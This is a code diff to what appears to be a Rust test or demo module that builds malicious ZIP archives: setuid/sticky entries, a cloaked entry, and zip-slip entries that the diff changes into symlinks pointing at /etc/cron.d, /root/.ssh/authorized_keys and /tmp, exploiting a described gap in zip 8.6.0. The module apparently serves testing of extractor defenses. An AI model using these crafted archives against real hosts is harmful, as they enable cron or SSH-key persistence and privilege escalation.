@@ -2,7 +2,8 @@
 //!
 //! These are hand-assembled ZIP bytes. The central-directory
 //! `external_attributes` carry hostile Unix modes (setuid/setgid/sticky)
-//! verbatim; some entry names are zip-slip paths; and a cloaked entry carries a
+//! verbatim; some entries are symlinks aimed at known paths outside the
+//! extraction folder (zip slip); and a cloaked entry carries a
 //! different name in its local header than in the central directory. The file
 //! BODIES are inert text — only the metadata and names are hostile. We emit the
 //! bytes ourselves because the `zip` crate's *writer* masks setuid with `& 0o777`
@@ -11,7 +12,7 @@
 //!
 //! Four crafted archives, one per attack button:
 //!   - `craft_suid_zip`      — Bug 1: three setuid/setgid/sticky entries.
-//!   - `craft_zipslip_zip`   — Bug 2: three path-traversal (zip-slip) entries.
+//!   - `craft_zipslip_zip`   — Bug 2: three symlink (zip-slip) entries.
 //!   - `craft_cloak_zip`     — Bug 3: one cloaked entry (CVE-2026-115905).
 //!   - `craft_combined_zip`  — Bug 4: every attack above in a single archive.
 
@@ -39,6 +40,13 @@ impl<'a> Entry<'a> {
     /// An honest entry: the local and central names match.
     fn plain(name: &'a str, mode: u32) -> Self {
         Entry { local_name: name, central_name: name, data: MARKER_BODY, mode }
+    }
+
+    /// A symlink entry (zip slip): Unix mode `S_IFLNK | 0o777`, and the body is
+    /// the link target. zip 8.6.0 refuses `../` names, but on a Unix target its
+    /// `extract()` creates the link without checking where it points.
+    fn symlink(name: &'a str, target: &'a str) -> Self {
+        Entry { local_name: name, central_name: name, data: target.as_bytes(), mode: 0o120777 }
     }
 
     /// A cloaked entry (CVE-2026-115905): the central directory advertises
@@ -128,14 +136,16 @@ fn suid_entries() -> [Entry<'static>; 3] {
     ]
 }
 
-/// The three zip-slip / path-traversal entries. Every name contains a `..`
-/// component, so a correct extractor refuses all three. Shared by Bug 2 and the
-/// combined run.
+/// The three zip-slip entries: symlinks aimed at known paths outside the
+/// extraction folder. A `../` name would be refused by zip 8.6.0 itself; a link
+/// is not, so on a Unix host each one lands as a real pointer out of the folder,
+/// and anything that later writes through it writes the real target. Shared by
+/// Bug 2 and the combined run.
 fn zipslip_entries() -> [Entry<'static>; 3] {
     [
-        Entry::plain("../../../../../../tmp/zip-slip-parent", 0o100644),
-        Entry::plain("../../../../../../etc/cron.d/zip-slip-cron", 0o100644),
-        Entry::plain("stuff/../../../../../../tmp/zip-slip-nested", 0o100644),
+        Entry::symlink("cron.d", "/etc/cron.d"),
+        Entry::symlink("authorized_keys", "/root/.ssh/authorized_keys"),
+        Entry::symlink("tmp", "/tmp"),
     ]
 }
 
@@ -144,8 +154,8 @@ pub fn craft_suid_zip() -> Vec<u8> {
     build_archive(&suid_entries())
 }
 
-/// Bug 2 (zip-slip / path traversal): three entries whose names try to escape
-/// the extraction tree.
+/// Bug 2 (zip slip): three symlink entries that point out of the extraction
+/// folder at known paths.
 pub fn craft_zipslip_zip() -> Vec<u8> {
     build_archive(&zipslip_entries())
 }
@@ -158,7 +168,7 @@ pub fn craft_cloak_zip() -> Vec<u8> {
 }
 
 /// Bug 4 (run all): every attack in one malicious archive — the three
-/// privileged-bit entries, the three zip-slip paths, and the cloaked entry.
+/// privileged-bit entries, the three zip-slip links, and the cloaked entry.
 /// Seven entries total.
 pub fn craft_combined_zip() -> Vec<u8> {
     let mut all: Vec<Entry> = Vec::new();
